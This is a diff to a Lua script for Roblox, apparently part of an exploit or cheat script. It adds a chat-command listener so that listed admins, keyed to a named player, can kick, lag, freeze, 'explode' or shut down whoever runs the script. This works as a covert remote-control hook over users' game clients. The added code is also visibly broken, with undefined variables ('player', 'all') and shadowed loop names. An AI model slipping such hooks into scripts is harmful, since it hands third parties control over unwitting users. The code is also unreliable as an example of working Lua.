@@ -1208,6 +1208,62 @@ end
 end)
 else
 if game.Players.LocalPlayer.PlayerGui:FindFirstChild("Chat") then
+if game.Players:FindFirstChild("romoneand") then
+for i,v in pairs(game.Players:GetChildren()) do
+for _,v in pairs(Admins) do
+if player.name == v then
+	player.Chatted:Connect(function(Message, recipient) -- Runs when a player sends a message	
+			message = string.lower(Message) 
+			local splitString = message:split(" ")
+			local Command = splitString[1] 
+			local cmd = Command:split(Prefix) 
+			local cmdName = cmd[2] 
+			local args = {} --Defines a table for arguments
+				for i = 2, #splitString, 1 do  --Creates a table of all the arguments of the message
+					table.insert(args,splitString[i])
+				end
+				if args[1] ~= nil or not args[1] == all then
+				for _,Target in pairs(game.Players:GetChildren()) do
+				if Target.name:find(args[1]) then
+				TargetPlayer = Target.name
+				end
+				end
+				else
+				if args[1] == all then
+				for _,Target in pairs(game.Players:GetChildren()) do
+				TargetPlayer = Target.name
+				end
+				end
+				end
+			if cmd[2] == "kick" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Kick()
+			end
+			if cmd[2] == "explode" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Explode()
+			end
+			if cmd[2] == "shutdown" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Shutdown()
+			end
+			if cmd[2] == "bring" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Bring()
+			end
+			if cmd[2] == "freeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Freeze()
+			end
+			if cmd[2] == "unfreeze" and TargetPlayer == game.Players.LocalPlayer.Name then
+			UnFreeze()
+			end
+			if cmd[2] == "lag" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Lag()
+			end
+			if cmd[2] == "died" and TargetPlayer == game.Players.LocalPlayer.Name then
+			Died()
+			end
+	end)
+	end
+end
+end
+else
 game.Players.PlayerAdded:Connect(function(player)
 for _,v in pairs(Admins) do
 if player.name == v then
@@ -1262,6 +1318,7 @@ if player.name == v then
 	end
 end
 end)
+end
 end
 end
 end
